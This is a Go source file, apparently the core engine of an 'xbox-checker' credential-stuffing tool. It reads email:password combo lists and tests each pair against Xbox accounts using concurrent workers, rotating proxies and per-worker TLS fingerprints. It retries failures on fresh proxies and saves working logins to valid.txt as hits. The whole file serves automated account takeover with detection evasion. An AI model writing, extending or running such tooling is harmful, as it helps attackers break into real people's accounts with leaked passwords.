package checker

import (
	"bufio"
	"fmt"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"xbox-checker/internal/core"
	"xbox-checker/internal/nettls"
	"xbox-checker/internal/proxy"
	"xbox-checker/internal/xbox"
)

var stopFlag int32
var pauseFlag int32

// SetStopFlag/SetPauseFlag are wired by the GUI so engine loops observe the
// stop/pause atomic flags.
func SetStopFlag(v int32)  { atomic.StoreInt32(&stopFlag, v) }
func SetPauseFlag(v int32) { atomic.StoreInt32(&pauseFlag, v) }

func hookOnTotal() {
	if Hooks.OnTotal != nil {
		Hooks.OnTotal()
	}
}

func sendProgress(ch chan ProgressEvent, ev ProgressEvent) {
	if ch == nil {
		return
	}
	select {
	case ch <- ev:
	default:
	}
}

func RunEngine(cfg Config, progressChan chan ProgressEvent) {
	file, err := os.Open(cfg.ComboPath)
	if err != nil {
		sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[FATAL] Combo file error: %v", err)})
		close(progressChan)
		return
	}
	defer file.Close()

	// Unlimited retries: soft-fails (proxy/preflight/network/etc.) go back into the
	// work queue and keep being retried with the next proxy until they succeed
	// or hit a hard failure (wrong credentials). There is no retry limit.
	workCh := make(chan string, 4096)
	var (
		pending    int64
		fileDone   int32
		firstLeft  int64
		retryPhase int32
		dailyStop  int32
	)
	var retryMu sync.Mutex
	retryBuf := make([]string, 0, 256)
	// Only this feeder sends retries onto workCh. Workers never send to workCh
	// (that deadlocks when every worker retries at once and the buffer is full).
	pumpRetries := func(n int) {
		for i := 0; i < n; i++ {
			retryMu.Lock()
			if len(retryBuf) == 0 {
				retryMu.Unlock()
				return
			}
			item := retryBuf[0]
			retryBuf = retryBuf[1:]
			retryMu.Unlock()
			select {
			case workCh <- item:
			default:
				retryMu.Lock()
				retryBuf = append([]string{item}, retryBuf...)
				retryMu.Unlock()
				return
			}
		}
	}

	// Track which combos are currently counted in the UI "Retries" number
	// so we only +1 the first time they soft-fail, and -1 when finally resolved.
	inRetry := sync.Map{}    // combo -> struct{}
	retryCount := sync.Map{} // combo -> int
	triedProxy := sync.Map{} // combo -> map[string]struct{}
	// Cap proxy attempts. Walking the whole list made 7k accounts take hours.
	maxProxyTries := 3
	if len(cfg.Proxies) > 0 && len(cfg.Proxies) < maxProxyTries {
		maxProxyTries = len(cfg.Proxies)
	}

	retryWant := map[int]bool{}
	if cfg.Session != nil {
		for k, n := range cfg.Session.RetryCounts {
			retryCount.Store(k, n)
		}
		for k, plist := range cfg.Session.TriedProxies {
			used := map[string]struct{}{}
			for _, p := range plist {
				used[p] = struct{}{}
			}
			triedProxy.Store(k, used)
		}
		for _, ln := range cfg.Session.RetryLines {
			retryWant[ln] = true
		}
	}

	go func() {
		scanner := bufio.NewScanner(file)
		idx := 0
		for scanner.Scan() {
			raw := strings.TrimSpace(scanner.Text())
			if raw == "" {
				continue
			}
			idx++
			if retryWant[idx] {
				inRetry.Store(LineKey(idx), struct{}{})
				atomic.AddInt64(&pending, 1)
				retryMu.Lock()
				retryBuf = append(retryBuf, PackWork(idx, raw))
				retryMu.Unlock()
				hookOnTotal()
				sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1})
				continue
			}
			if cfg.Session != nil && RangeHas(cfg.Session.DoneRanges, idx) {
				continue
			}
			atomic.AddInt64(&pending, 1)
			atomic.AddInt64(&firstLeft, 1)
			hookOnTotal()
			workCh <- PackWork(idx, raw)
		}
		atomic.StoreInt32(&fileDone, 1)
	}()

	go func() {
		for {
			pumpRetries(cfg.Workers * 2)
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&firstLeft) <= 0 {
				atomic.StoreInt32(&retryPhase, 1)
			}
			if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
				return
			}
			if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
				return
			}
			time.Sleep(20 * time.Millisecond)
		}
	}()

	// Workers keep running until everything is resolved
	var wg sync.WaitGroup
	for i := 0; i < cfg.Workers; i++ {
		wg.Add(1)
		go func(workerID int) {
			defer wg.Done()
			wfp := nettls.NewWorkerFP(workerID)
			for {
				// Exit condition: file fully loaded and nothing left pending
				if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				if atomic.LoadInt32(&fileDone) == 1 && atomic.LoadInt64(&pending) <= 0 {
					return
				}

				var raw string
				select {
				case raw = <-workCh:
				case <-time.After(100 * time.Millisecond):
					continue
				}
				for atomic.LoadInt32(&pauseFlag) == 1 {
					if atomic.LoadInt32(&dailyStop) == 1 || atomic.LoadInt32(&stopFlag) == 1 {
						return
					}
					time.Sleep(200 * time.Millisecond)
				}
				lineNo, combo := UnpackWork(raw)
				lk := LineKey(lineNo)

				parts := strings.SplitN(combo, ":", 2)
				if len(parts) != 2 {
					sendProgress(progressChan, ProgressEvent{LogMsg: fmt.Sprintf("[WARN] Malformed combo: %s", combo)})
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					MarkLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}
				email, password := parts[0], parts[1]

				if atomic.LoadInt32(&stopFlag) == 1 {
					return
				}
				if atomic.LoadInt32(&dailyStop) == 1 || core.AtLimit() {
					if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
						sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: core.DailyUsed(), LogMsg: core.LimitMessage()})
					}
					retryMu.Lock()
					retryBuf = append(retryBuf, PackWork(lineNo, combo))
					retryMu.Unlock()
					continue
				}

				// Round-robin next proxy (different proxy on every attempt)
				proxyStr := ""
				if len(cfg.Proxies) > 0 {
					proxyStr = proxy.TakeLive("check", cfg.Proxies)
				}

				formattedHit, valid, logMsg, shouldRetry := xbox.ExecuteAccountValidation(email, password, proxyStr, cfg.Proxies, cfg.Keywords, wfp, cfg)

				if valid {
					used := core.AddDailyValid()
					core.AppendResult("valid.txt", formattedHit)
					sendProgress(progressChan, ProgressEvent{IsValid: true, Hit: formattedHit, LogMsg: logMsg, Daily: used})
					if used >= core.DailyLimit {
						if atomic.CompareAndSwapInt32(&dailyStop, 0, 1) {
							sendProgress(progressChan, ProgressEvent{LimitHit: true, Daily: used, LogMsg: core.LimitMessage()})
						}
					}
					if _, loaded := inRetry.LoadAndDelete(lk); loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
					}
					MarkLineDone(&cfg, lineNo)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					atomic.AddInt64(&pending, -1)
					continue
				}

				if shouldRetry {
					n := 1
					if v, ok := retryCount.Load(lk); ok {
						n = v.(int) + 1
					}
					retryCount.Store(lk, n)
					used := map[string]struct{}{}
					if v, ok := triedProxy.Load(lk); ok {
						if m, ok := v.(map[string]struct{}); ok {
							used = m
						}
					}
					if proxyStr != "" {
						used[proxyStr] = struct{}{}
					}
					triedProxy.Store(lk, used)
					donePool := len(cfg.Proxies) > 0 && len(used) >= len(cfg.Proxies)
					if n >= maxProxyTries || donePool {
						if _, loaded := inRetry.LoadAndDelete(lk); loaded {
							sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
						}
						MarkLineDone(&cfg, lineNo)
						if atomic.LoadInt32(&retryPhase) == 0 {
							atomic.AddInt64(&firstLeft, -1)
						}
						atomic.AddInt64(&pending, -1)
						continue
					}
					if _, loaded := inRetry.LoadOrStore(lk, struct{}{}); !loaded {
						sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: 1})
					}
					MarkLinePending(&cfg, lineNo, n, used)
					if atomic.LoadInt32(&retryPhase) == 0 {
						atomic.AddInt64(&firstLeft, -1)
					}
					retryMu.Lock()
					retryBuf = append(retryBuf, PackWork(lineNo, combo))
					retryMu.Unlock()
					continue
				}

				if logMsg != "" {
					sendProgress(progressChan, ProgressEvent{LogMsg: logMsg})
				} else {
					sendProgress(progressChan, ProgressEvent{IsValid: false})
				}
				if _, loaded := inRetry.LoadAndDelete(lk); loaded {
					sendProgress(progressChan, ProgressEvent{IsRetry: true, RetryDelta: -1})
				}
				MarkLineDone(&cfg, lineNo)
				if atomic.LoadInt32(&retryPhase) == 0 {
					atomic.AddInt64(&firstLeft, -1)
				}
				atomic.AddInt64(&pending, -1)
			}
		}(i)
	}

	wg.Wait()
	if atomic.LoadInt32(&stopFlag) == 1 {
		SaveAt(cfg.Session, true)
	} else if atomic.LoadInt32(&dailyStop) == 0 {
		Delete(cfg.Session)
	} else {
		SaveAt(cfg.Session, true)
	}
	sendProgress(progressChan, ProgressEvent{IsDone: true})
	close(progressChan)
}
